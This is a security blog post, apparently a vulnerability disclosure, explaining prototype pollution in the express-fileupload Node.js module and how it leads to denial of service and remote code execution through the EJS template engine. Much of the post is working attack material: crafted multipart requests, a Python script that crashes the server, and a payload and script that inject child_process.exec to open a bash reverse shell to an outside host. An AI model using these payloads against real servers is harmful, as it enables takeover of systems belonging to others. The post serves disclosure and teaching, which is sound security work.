<!DOCTYPE html><html lang="en"><head><meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="HandheldFriendly" content="True"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1"><meta name="description" content="Real-world JS 1Real-world JS Vulnerabilities Series 1express-fileuploadJavaScript Vulnerabilities (prototype pollution, redos, type confusion etc) is a popular topic in recent security competition suc"><meta property="og:type" content="article"><meta property="og:title" content="Real-world JS - 1"><meta property="og:url" content="https://blog.p6.is/Real-World-JS-1/index.html"><meta property="og:site_name" content="POSIX"><meta property="og:description" content="Real-world JS 1Real-world JS Vulnerabilities Series 1express-fileuploadJavaScript Vulnerabilities (prototype pollution, redos, type confusion etc) is a popular topic in recent security competition suc"><meta property="og:locale" content="en_US"><meta property="og:image" content="https://blog.p6.is/img/2020/07/image-20200729093633030.png"><meta property="og:image" content="https://blog.p6.is/img/2020/07/image-20200729093731270.png"><meta property="og:image" content="https://blog.p6.is/img/2020/07/image-20200729094135815.png"><meta property="og:image" content="https://blog.p6.is/img/2020/07/image-20200729100022061.png"><meta property="og:image" content="https://blog.p6.is/img/2020/07/image-20200729100528922.png"><meta property="og:image" content="https://blog.p6.is/img/2020/07/image-20200729101543292.png"><meta property="og:image" content="https://blog.p6.is/img/2020/07/image-20200729102550071.png"><meta property="og:image" content="https://blog.p6.is/img/2020/07/image-20200729102347702.png"><meta property="og:image" content="https://blog.p6.is/img/2020/07/image-20200729103038537.png"><meta property="og:image" content="https://blog.p6.is/img/2020/07/image-20200729103132948.png"><meta property="og:image" content="https://blog.p6.is/img/2020/07/image-20200729104502663.png"><meta property="article:published_time" content="2020-07-29T02:29:02.000Z"><meta property="article:modified_time" content="2020-07-29T02:49:36.174Z"><meta property="article:author" content="posix"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="https://blog.p6.is/img/2020/07/image-20200729093633030.png"><link rel="shortcut icon" href="https://www.gravatar.com/avatar/b014d4712efdcda5c822e4ede732e29a?s=16"><link rel="icon" type="image/png" href="https://www.gravatar.com/avatar/b014d4712efdcda5c822e4ede732e29a?s=192" sizes="192x192"><link rel="apple-touch-icon" sizes="180x180" href="https://www.gravatar.com/avatar/b014d4712efdcda5c822e4ede732e29a?s=180"><title>Real-world JS - 1</title><link rel="stylesheet" href="/css/style.css"><link rel="stylesheet" href="/css/rtl.css"><meta name="generator" content="Hexo 6.0.0"><link rel="alternate" href="/atom.xml" title="POSIX" type="application/atom+xml"></head><body class="max-width mx-auto px3 ltr"><div id="header-post"><a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a> <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a> <a id="top-icon-tablet" href="#" onclick='$("html, body").animate({scrollTop:0},"fast")' style="display:none"><i class="fas fa-chevron-up fa-lg"></i></a> <span id="menu"><span id="nav"><ul></ul></span><br><span id="actions"><ul><li><a class="icon" href="/AST-Injection/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover='$("#i-prev").toggle()' onmouseout='$("#i-prev").toggle()'></i></a></li><li><a class="icon" href="/Review-of-2020-Defenit-CTF/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover='$("#i-next").toggle()' onmouseout='$("#i-next").toggle()'></i></a></li><li><a class="icon" href="#" onclick='$("html, body").animate({scrollTop:0},"fast")'><i class="fas fa-chevron-up" aria-hidden="true" onmouseover='$("#i-top").toggle()' onmouseout='$("#i-top").toggle()'></i></a></li><li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover='$("#i-share").toggle()' onmouseout='$("#i-share").toggle()' onclick='return $("#share").toggle(),!1'></i></a></li></ul><span id="i-prev" class="info" style="display:none">Previous post</span> <span id="i-next" class="info" style="display:none">Next post</span> <span id="i-top" class="info" style="display:none">Back to top</span> <span id="i-share" class="info" style="display:none">Share post</span></span><br><div id="share" style="display:none"><ul><li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://blog.p6.is/Real-World-JS-1/"><i class="fab fa-facebook" aria-hidden="true"></i></a></li><li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://blog.p6.is/Real-World-JS-1/&text=Real-world JS - 1"><i class="fab fa-twitter" aria-hidden="true"></i></a></li></ul></div><div id="toc"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Real-world-JS-1"><span class="toc-number">1.</span> <span class="toc-text">Real-world JS 1</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#express-fileupload"><span class="toc-number">1.1.</span> <span class="toc-text">express-fileupload</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#How-to-get-shell"><span class="toc-number">1.2.</span> <span class="toc-text">How to get shell?</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Reference"><span class="toc-number">1.3.</span> <span class="toc-text">Reference</span></a></li></ol></li></ol></div></span></div><div class="content index py4"><article class="post" itemscope itemtype="http://schema.org/BlogPosting"><header><h1 class="posttitle" itemprop="name headline">Real-world JS - 1</h1><div class="meta"><span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person"><span itemprop="name">POSIX</span></span><div class="postdate">&nbsp;<time datetime="2020-07-29T02:29:02.000Z" itemprop="datePublished">2020-07-29</time></div>&nbsp;<div class="article-category">&nbsp;<i class="fas fa-archive"></i> <a class="category-link" href="/category/docs/">Docs</a></div>&nbsp;</div></header><div class="content" itemprop="articleBody"><h1 id="Real-world-JS-1"><a href="#Real-world-JS-1" class="headerlink" title="Real-world JS 1"></a>Real-world JS 1</h1><blockquote><p>Real-world JS Vulnerabilities Series 1</p></blockquote><h2 id="express-fileupload"><a href="#express-fileupload" class="headerlink" title="express-fileupload"></a>express-fileupload</h2><p>JavaScript Vulnerabilities (prototype pollution, redos, type confusion etc) is a popular topic in recent security competition such as CTFs<br>But, there seems to be a lack of real-world research for them, so I started research to find it and share data.</p><p>This research aims to improve the nodejs ecosystem security level.</p><p><img src="/img/2020/07/image-20200729093633030.png" alt="image-20200729093633030"></p><p>This vulnerability is in the first case about the <code>express-fileupload</code>.<br>As shown in the name, this module provide file upload function as <code>express middleware</code></p><p><img src="/img/2020/07/image-20200729093731270.png" alt="image-20200729093731270"></p><p>Until today, this <code>express-fileupload</code> has been downloaded a total of <code>7,193,433</code> times.</p><p><img src="/img/2020/07/image-20200729094135815.png" alt="image-20200729094135815"></p><p>The <code>express-fileupload</code> module provides several options for uploading and managing files in the nodejs application.<br>Among them, the <code>parseNested</code> make argument flatten.</p><p>Therefore, if we provide <code>{&quot;a.b.c&quot;: true}</code> as an input,<br>Internally, It will used as <code>{&quot;a&quot;: {&quot;b&quot;: {&quot;c&quot;: true}}}</code></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">busboy.on(<span class="string">'finish'</span>, () =&gt; &#123;</span><br><span class="line">    debugLog(options, <span class="string">`Busboy finished parsing request.`</span>);</span><br><span class="line">    <span class="keyword">if</span> (options.parseNested) &#123;</span><br><span class="line">        req.body = processNested(req.body);</span><br><span class="line">        req.files = processNested(req.files);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!req[waitFlushProperty]) <span class="keyword">return</span> next();</span><br><span class="line">    <span class="built_in">Promise</span>.all(req[waitFlushProperty])</span><br><span class="line">        .then(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">delete</span> req[waitFlushProperty];</span><br><span class="line">        next();</span><br><span class="line">    &#125;).catch(<span class="function"><span class="params">err</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">delete</span> req[waitFlushProperty];</span><br><span class="line">        debugLog(options, <span class="string">`Error while waiting files flush: <span class="subst">$&#123;err&#125;</span>`</span>);</span><br><span class="line">        next(err);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>So, if <code>options.parseNested</code> has a value. If calls <code>processNested</code> Function, and argument will be <code>req.body</code> and <code>req.files</code>.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">processNested</span>(<span class="params">data</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!data || data.length &lt; <span class="number">1</span>) <span class="keyword">return</span> &#123;&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> d = &#123;&#125;,</span><br><span class="line">        keys = <span class="built_in">Object</span>.keys(data);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; keys.length; i++) &#123;</span><br><span class="line">        <span class="keyword">let</span> key = keys[i],</span><br><span class="line">            value = data[key],</span><br><span class="line">            current = d,</span><br><span class="line">            keyParts = key</span><br><span class="line">        .replace(<span class="keyword">new</span> <span class="built_in">RegExp</span>(<span class="regexp">/\[/g</span>), <span class="string">'.'</span>)</span><br><span class="line">        .replace(<span class="keyword">new</span> <span class="built_in">RegExp</span>(<span class="regexp">/\]/g</span>), <span class="string">''</span>)</span><br><span class="line">        .split(<span class="string">'.'</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> index = <span class="number">0</span>; index &lt; keyParts.length; index++)&#123;</span><br><span class="line">            <span class="keyword">let</span> k = keyParts[index];</span><br><span class="line">            <span class="keyword">if</span> (index &gt;= keyParts.length - <span class="number">1</span>)&#123;</span><br><span class="line">                current[k] = value;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (!current[k]) current[k] = !<span class="built_in">isNaN</span>(keyParts[index + <span class="number">1</span>]) ? [] : &#123;&#125;;</span><br><span class="line">                current = current[k];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> d;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>The above is the full source of the <code>processNested</code> function.<br>Here provides <code>flatten</code> function for key, of <code>req.files</code>.</p><p>It split the key value of the first argument of object obtained through <code>Object.keys(data)</code> by <code>.</code><br>and makes loop using that, and refers/define object repeatedly.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> some_obj = <span class="built_in">JSON</span>.parse(<span class="string">`&#123;"__proto__.polluted": true&#125;`</span>);</span><br><span class="line">processNested(some_obj);</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(polluted); <span class="comment">// true!</span></span><br></pre></td></tr></table></figure><p>In this function, prototype pollution vulnerability is caused by the above usage.<br>Therefore, if we can put manufactured objects in this function, it can affect the express web application.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">'express'</span>);</span><br><span class="line"><span class="keyword">const</span> fileUpload = <span class="built_in">require</span>(<span class="string">'express-fileupload'</span>);</span><br><span class="line"><span class="keyword">const</span> app = express();</span><br><span class="line"></span><br><span class="line">app.use(fileUpload(&#123; <span class="attr">parseNested</span>: <span class="literal">true</span> &#125;));</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">'/'</span>, (req, res) =&gt; &#123;</span><br><span class="line">    res.end(<span class="string">'express-fileupload poc'</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.listen(<span class="number">7777</span>)</span><br></pre></td></tr></table></figure><p>Therefore, configure and run the express server using <code>express-fileupload</code> in the above form.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/<span class="number">1.1</span></span><br><span class="line">Content-Type: multipart/form-data; boundary=-------<span class="number">-1566035451</span></span><br><span class="line">Content-Length: <span class="number">123</span></span><br><span class="line"></span><br><span class="line">---------<span class="number">-1566035451</span></span><br><span class="line">Content-Disposition: form-data; name=<span class="string">"name"</span>; filename=<span class="string">"filename"</span></span><br><span class="line"></span><br><span class="line">content</span><br><span class="line">---------<span class="number">-1566035451</span>--</span><br></pre></td></tr></table></figure><p>And I send the above <code>POST</code> request.</p><p><img src="/img/2020/07/image-20200729100022061.png" alt="image-20200729100022061"></p><p>Then we can confirm that the some object is given as the argument of <code>processNested</code> function. (I added code for debug)</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/<span class="number">1.1</span></span><br><span class="line">Content-Type: multipart/form-data; boundary=-------<span class="number">-1566035451</span></span><br><span class="line">Content-Length: <span class="number">137</span></span><br><span class="line"></span><br><span class="line">---------<span class="number">-1566035451</span></span><br><span class="line">Content-Disposition: form-data; name=<span class="string">"__proto__.toString"</span>; filename=<span class="string">"filename"</span></span><br><span class="line"></span><br><span class="line">content</span><br><span class="line">---------<span class="number">-1566035451</span>--</span><br></pre></td></tr></table></figure><p>Let‚Äôs try <code>prototype pollution</code><br>If we send this with the name changed to <code>__proto__.toString</code>.</p><p><img src="/img/2020/07/image-20200729100528922.png" alt="image-20200729100528922"></p><p>An object with the key <code>__proto__.toString</code> is created and call processNested function.<br>and pollute <code>toString</code> method of <code>Object.prototype</code>.<br>And from the moment this value is covered with a object that is not a function.<br>The <code>express</code> application makes error for every request !</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> isRegExp = <span class="function"><span class="keyword">function</span> <span class="title">isRegExp</span>(<span class="params">obj</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">Object</span>.prototype.toString.call(obj) === <span class="string">'[object RegExp]'</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>In the <code>qs</code> module used within the <code>express</code>, <code>location.search</code> part of the HTTP request will be parsed and make it to <code>req.query</code> object.<br>In that logic, <code>qs</code> uses <code>Object.prototype.toString</code>.<br>Therefore, this function called for every request in the express application (even if there is no search part)<br>If <code>Object.prototype.toString</code> can be polluted, this will cause an error.<br>and for every request, express always returns 500 error.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">res = requests.post(<span class="string">'http://p6.is:7777'</span>, files = &#123;<span class="string">'__proto__.toString'</span>: <span class="string">'express-fileupload poc'</span>&#125;);</span><br></pre></td></tr></table></figure><p>Actually, if we use script above to pollute the prototype of <code>server</code></p><p><img src="/img/2020/07/image-20200729101543292.png" alt="image-20200729101543292"></p><p>For all requests, the server returns either these error messages (development mode)<br>or only a blank screen and <code>500 Internal Server Error</code>! üòÆ</p><h2 id="How-to-get-shell"><a href="#How-to-get-shell" class="headerlink" title="How to get shell?"></a>How to get shell?</h2><p>We can already make a DOS, but everyone wants a shell.<br>So, I‚Äôll describe one way to acquire shell through the vulnerability above.</p><p><img src="/img/2020/07/image-20200729102550071.png" alt="image-20200729102550071"></p><p>The simplest way to obtain shell through <code>prototype solution</code> in the express application is by using the <code>ejs</code>.<br>Yes, There is a limitation to whether the application should be using the <code>ejs template engine</code></p><p><img src="/img/2020/07/image-20200729102347702.png" alt="image-20200729102347702"></p><p>But the EJS is the most popular template engine for the nodejs<br>and also used very often in combination with the express.</p><p>If this vulnerability exists, you can bet on this. (no guaranteed üòè)</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">'express'</span>);</span><br><span class="line"><span class="keyword">const</span> fileUpload = <span class="built_in">require</span>(<span class="string">'express-fileupload'</span>);</span><br><span class="line"><span class="keyword">const</span> app = express();</span><br><span class="line"></span><br><span class="line">app.use(fileUpload(&#123; <span class="attr">parseNested</span>: <span class="literal">true</span> &#125;));</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">'/'</span>, (req, res) =&gt; &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="built_in">Object</span>.prototype.polluted);</span><br><span class="line">    res.render(<span class="string">'index.ejs'</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.listen(<span class="number">7777</span>);</span><br></pre></td></tr></table></figure><p>The above is an example of using the ejs module.<br>There was only one line change in replacing the rendering engine.</p><p>Because the parseNested option is still active, we can still pollute prototype.<br>Unlike the above here, I will use <code>req.body</code> object.</p><p>Because we can manipulated the value of that as string.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Content-Type: multipart&#x2F;form-data; boundary&#x3D;--------1566035451</span><br><span class="line">Content-Length: 137</span><br><span class="line"></span><br><span class="line">----------1566035451</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;__proto__.polluted&quot;;</span><br><span class="line"></span><br><span class="line">content</span><br><span class="line">----------1566035451--</span><br></pre></td></tr></table></figure><p>Similar with above, but the <code>filename</code>of <code>Content-Disposition</code> has been deleted.<br>Then the value will go to <code>req.body</code> not <code>req.files</code>.</p><p><img src="/img/2020/07/image-20200729103038537.png" alt="image-20200729103038537">)<img src="/img/2020/07/image-20200729103132948.png" alt="image-20200729103132948"></p><p>By checking the values that enter the <code>processNested</code> function<br>You can see that the values that were previously objects is now string.</p><p>pollution happens the same as before.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Template</span>(<span class="params">text, opts</span>) </span>&#123;</span><br><span class="line">  opts = opts || &#123;&#125;;</span><br><span class="line">  <span class="keyword">var</span> options = &#123;&#125;;</span><br><span class="line">  <span class="keyword">this</span>.templateText = text;</span><br><span class="line">  <span class="comment">/** <span class="doctag">@type <span class="type">&#123;string | null&#125;</span> </span>*/</span></span><br><span class="line">  ...</span><br><span class="line">  options.outputFunctionName = opts.outputFunctionName;</span><br><span class="line">  options.localsName = opts.localsName || exports.localsName || _DEFAULT_LOCALS_NAME;</span><br><span class="line">  options.views = opts.views;</span><br><span class="line">  options.async = opts.async;</span><br></pre></td></tr></table></figure><p>The target value to pollute is the <code>outputFunctionName</code>, which is an option in the ejs rendering function.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">compile: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="comment">/** <span class="doctag">@type <span class="type">&#123;string&#125;</span> </span>*/</span></span><br><span class="line">  <span class="keyword">var</span> src;</span><br><span class="line">  <span class="comment">/** <span class="doctag">@type <span class="type">&#123;ClientFunction&#125;</span> </span>*/</span></span><br><span class="line">  <span class="keyword">var</span> fn;</span><br><span class="line">  <span class="keyword">var</span> opts = <span class="keyword">this</span>.opts;</span><br><span class="line">  <span class="keyword">var</span> prepended = <span class="string">''</span>;</span><br><span class="line">  <span class="keyword">var</span> appended = <span class="string">''</span>;</span><br><span class="line">  <span class="comment">/** <span class="doctag">@type <span class="type">&#123;EscapeCallback&#125;</span> </span>*/</span></span><br><span class="line">  <span class="keyword">var</span> escapeFn = opts.escapeFunction;</span><br><span class="line">  <span class="comment">/** <span class="doctag">@type <span class="type">&#123;FunctionConstructor&#125;</span> </span>*/</span></span><br><span class="line">  <span class="keyword">var</span> ctor;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!<span class="keyword">this</span>.source) &#123;</span><br><span class="line">    <span class="keyword">this</span>.generateSource();</span><br><span class="line">    prepended +=</span><br><span class="line">      <span class="string">'  var __output = "";\n'</span> +</span><br><span class="line">      <span class="string">'  function __append(s) &#123; if (s !== undefined &amp;&amp; s !== null) __output += s &#125;\n'</span>;</span><br><span class="line">    <span class="keyword">if</span> (opts.outputFunctionName) &#123;</span><br><span class="line">      prepended += <span class="string">'  var '</span> + opts.outputFunctionName + <span class="string">' = __append;'</span> + <span class="string">'\n'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (opts.destructuredLocals &amp;&amp; opts.destructuredLocals.length) &#123;</span><br><span class="line">      <span class="keyword">var</span> destructuring = <span class="string">'  var __locals = ('</span> + opts.localsName + <span class="string">' || &#123;&#125;),\n'</span>;</span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; opts.destructuredLocals.length; i++) &#123;</span><br><span class="line">        <span class="keyword">var</span> name = opts.destructuredLocals[i];</span><br><span class="line">        <span class="keyword">if</span> (i &gt; <span class="number">0</span>) &#123;</span><br><span class="line">          destructuring += <span class="string">',\n  '</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        destructuring += name + <span class="string">' = __locals.'</span> + name;</span><br><span class="line">      &#125;</span><br><span class="line">      prepended += destructuring + <span class="string">';\n'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (opts._with !== <span class="literal">false</span>) &#123;</span><br><span class="line">      prepended +=  <span class="string">'  with ('</span> + opts.localsName + <span class="string">' || &#123;&#125;) &#123;'</span> + <span class="string">'\n'</span>;</span><br><span class="line">      appended += <span class="string">'  &#125;'</span> + <span class="string">'\n'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    appended += <span class="string">'  return __output;'</span> + <span class="string">'\n'</span>;</span><br><span class="line">    <span class="keyword">this</span>.source = prepended + <span class="keyword">this</span>.source + appended;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>The ejs makes Function for implement their template and executing<br>and the <code>outputFunctionName</code> option used in the process is included in the function.</p><p>Therefore, if we can manipulate this value, any command can be executed.</p><p>This technique was introduced by a Chinese CTF in 2019.<br>Please refer to <a href="https://github.com/NeSE-Team/OurChallenges/tree/master/XNUCA2019Qualifier/Web/hardjs" target="_blank" rel="noopener">here</a> for details.</p><p>That part has not been patched so far, and it is expected to remain in the future.<br>So we can take advantage of it.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/<span class="number">1.1</span></span><br><span class="line">Content-Type: multipart/form-data; boundary=-------<span class="number">-1566035451</span></span><br><span class="line">Content-Length: <span class="number">221</span></span><br><span class="line"></span><br><span class="line">---------<span class="number">-1566035451</span></span><br><span class="line">Content-Disposition: form-data; name=<span class="string">"__proto__.outputFunctionName"</span>;</span><br><span class="line"></span><br><span class="line">x;process.mainModule.require(<span class="string">'child_process'</span>).exec(<span class="string">'bash -c "bash -i &amp;&gt; /dev/tcp/p6.is/8888 0&gt;&amp;1"'</span>);x</span><br><span class="line">---------<span class="number">-1566035451</span>--</span><br></pre></td></tr></table></figure><p>So first, we‚Äôre going to pollute the <code>Object.prototype.outputFunctionName</code> using the <code>prototype pollution</code>.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: p6.is:7777</span><br></pre></td></tr></table></figure><p>and calls template function of ejs.</p><p><img src="/img/2020/07/image-20200729104502663.png" alt="image-20200729104502663"></p><p>Then we can get the shell !<br>If all the process can be represented by python:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">cmd = <span class="string">'bash -c "bash -i &amp;&gt; /dev/tcp/p6.is/8888 0&gt;&amp;1"'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># pollute</span></span><br><span class="line">requests.post(<span class="string">'http://p6.is:7777'</span>, files = &#123;<span class="string">'__proto__.outputFunctionName'</span>: (</span><br><span class="line">    <span class="literal">None</span>, <span class="string">f"x;console.log(1);process.mainModule.require('child_process').exec('<span class="subst">&#123;cmd&#125;</span>');x"</span>)&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment"># execute command</span></span><br><span class="line">requests.get(<span class="string">'http://p6.is:7777'</span>)</span><br></pre></td></tr></table></figure><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ul><li><a href="https://github.com/richardgirges/express-fileupload/issues/236" target="_blank" rel="noopener">https://github.com/richardgirges/express-fileupload/issues/236</a></li><li><a href="https://www.npmjs.com/package/express-fileupload" target="_blank" rel="noopener">https://www.npmjs.com/package/express-fileupload</a></li><li><a href="https://github.com/NeSE-Team/OurChallenges/tree/master/XNUCA2019Qualifier/Web/hardjs" target="_blank" rel="noopener">https://github.com/NeSE-Team/OurChallenges/tree/master/XNUCA2019Qualifier/Web/hardjs</a></li></ul></div></article><div class="blog-post-comments"><div id="disqus_thread"><noscript>Please enable JavaScript to view the comments.</noscript></div></div><div id="footer-post-container"><div id="footer-post"><div id="nav-footer" style="display:none"><ul></ul></div><div id="toc-footer" style="display:none"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Real-world-JS-1"><span class="toc-number">1.</span> <span class="toc-text">Real-world JS 1</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#express-fileupload"><span class="toc-number">1.1.</span> <span class="toc-text">express-fileupload</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#How-to-get-shell"><span class="toc-number">1.2.</span> <span class="toc-text">How to get shell?</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Reference"><span class="toc-number">1.3.</span> <span class="toc-text">Reference</span></a></li></ol></li></ol></div><div id="share-footer" style="display:none"><ul><li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://blog.p6.is/Real-World-JS-1/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li><li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://blog.p6.is/Real-World-JS-1/&text=Real-world JS - 1"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li></ul></div><div id="actions-footer"><a id="menu" class="icon" href="#" onclick='return $("#nav-footer").toggle(),!1'><i class="fas 